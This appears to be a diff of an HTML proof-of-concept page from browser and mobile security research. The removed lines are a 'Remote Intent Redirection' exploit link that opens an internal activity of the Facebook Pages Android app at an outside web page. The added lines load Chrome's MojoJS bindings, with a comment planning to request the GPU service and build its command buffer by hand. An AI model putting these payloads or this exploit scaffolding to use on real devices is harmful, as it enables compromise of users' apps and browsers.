@@ -1,17 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>1-Click Remote Exploit</title>
-    <style>
-        body { font-family: sans-serif; padding: 20px; text-align: center; }
-        button { padding: 15px; font-size: 16px; background: #1877f2; color: white; border: none; border-radius: 5px; width: 100%; margin-bottom: 20px; }
-    </style>
+    <title>MojoJS Setup</title>
 </head>
 <body>
-    <h2>Remote Intent Redirection PoC</h2>
-    <a href="intent://linux-1723.github.io/test/index.html#Intent;scheme=https;package=com.facebook.pages.app;component=com.facebook.pages.app/com.facebook.pages.app.activity.PagesManagerIntentHandlerActivity;end">
-      Open in Facebook Pages App
-    </a>
+    <h1>MojoJS ES6 Module Loader</h1>
+    
+    <!-- Use an import map so the browser knows where to find the Mojo files -->
+    <script type="importmap">
+        {
+            "imports": {
+                "mojo_bindings": "gen/mojo/public/js/mojo_bindings.js",
+                "gpu_channel": "gen/gpu/ipc/common/gpu_channel.mojom.js"
+            }
+        }
+    </script>
+
+    <!-- MUST be type="module" -->
+    <script type="module">
+        import { Mojo } from 'mojo_bindings';
+        
+        // This will now successfully log the Mojo object without 'export' syntax errors!
+        console.log("Mojo API loaded successfully: ", Mojo);
+        
+        // Next step: we have to request viz.mojom.GpuService here to build 
+        // the Command Buffer manually.
+    </script>
 </body>
 </html>
